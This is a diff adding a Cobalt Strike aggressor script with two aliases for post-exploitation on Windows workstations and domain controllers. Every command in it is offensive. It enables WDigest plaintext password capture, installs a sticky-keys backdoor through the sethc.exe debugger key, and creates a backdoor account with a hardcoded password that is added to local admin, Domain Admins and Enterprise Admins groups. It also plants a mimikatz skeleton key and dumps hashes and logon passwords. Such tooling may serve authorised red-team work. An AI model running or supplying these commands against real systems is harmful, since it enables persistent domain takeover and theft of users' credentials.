@@ -1,0 +1,75 @@
+
+# Read before loading into CS.  DEFINITELY read before deployment! 
+# None of this is particularly stealthy.  There are better ways of staying low and slow than these!
+
+# TO DO - create a dialogue box that asks you for the hostname of the DC / Target Server, then remote registry to set wdigest. eg:
+# bshell($beacon, "reg add \\\\TargetIP\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 # /f");
+
+# If you have system or admin on a workstation.
+
+alias("SYSTEM_WORKSTATION", {
+	$beacon = $1;
+
+	# Record plaintext passwords upon next logon (use 'wdigest' hashdumping on the target to see them)
+	bshell($beacon, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+
+
+	# Install sticky keys backdoor (different way than file substitution)
+	bshell($beacon, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f");	
+
+	# Install backdoor users (loud!)
+	bshell($beacon, "net user BaffledJimmy Lolgreatpassw0rd125! /add");
+	bshell($beacon, "net localgroup \"administrators\" BaffledJimmy /add");
+	bshell($beacon, "net localgroup \"remote desktop users\" BaffledJimmy /add");
+	bshell($beacon, "net localgroup \"remote management users\" BaffledJimmy /add");
+
+	# Enable caching of domain creds from now.
+	bshell($beacon, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableDomainCreds /t REG_DWORD /d 0 /f");
+
+	# hashdumps
+	bwdigest($beacon);
+	bhashdump($beacon);
+	blogonpasswords($beacon);
+});
+
+# If you have high integrity on a DC (either as elevated admin or as SYSTEM)
+alias("SYSTEM_DC", {
+	$beacon = $1;
+
+	# mimikatz skeleton key
+	bmimikatz($beacon, "privilege::debug");    
+   	bmimikatz($beacon, "misc::skeleton");
+
+	# Record plaintext passwords upon next logon (use 'wdigest' hashdumping on the target to view)
+	bshell($beacon, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+
+	# Enable caching of domain creds.
+	bshell($beacon, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableDomainCreds /t REG_DWORD /d 0 /f");
+
+	# Install backdoor users
+	bshell($beacon, "net user BaffledJimmy Lolgreatpassw0rd125! /add");
+	bshell($beacon, "net localgroup \"administrators\" BaffledJimmy /add");
+	bshell($beacon, "net localgroup \"remote desktop users\" BaffledJimmy /add");
+	bshell($beacon, "net localgroup \"remote management users\" BaffledJimmy /add");
+	bshell($beacon, "net group \"domain admins\" BaffledJimmy /add");
+	bshell($beacon, "net group \"enterprise admins\" BaffledJimmy /add");
+	
+	# Install sticky keys backdoor (using the debugger flag)
+	bshell($beacon, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f");	
+
+	# change DA password (uncomment if you want this - do not use in Prod!)
+	# bshell($beacon, "net user administrator Lolgreatpassw0rd125! /add");
+
+	# Promote another user to DA (loud!). Uncomment if you want this.
+	# bshell($beacon, "net user RandomUser Lolgreatpassw0rd125!");
+	# bshell($beacon, "net localgroup \"administrators\" RandomUser /add");
+	# bshell($beacon, "net localgroup \"remote desktop users\" RandomUser /add");
+	# bshell($beacon, "net localgroup \"remote management users\" RandomUser /add");
+	# bshell($beacon, "net group \"domain admins\" RandomUser /add");
+	# bshell($beacon, "net group \"enterprise admins\" RandomUser /add");
+
+	# hashdumps
+	bwdigest($beacon);
+	bhashdump($beacon);
+	blogonpasswords($beacon);
+});
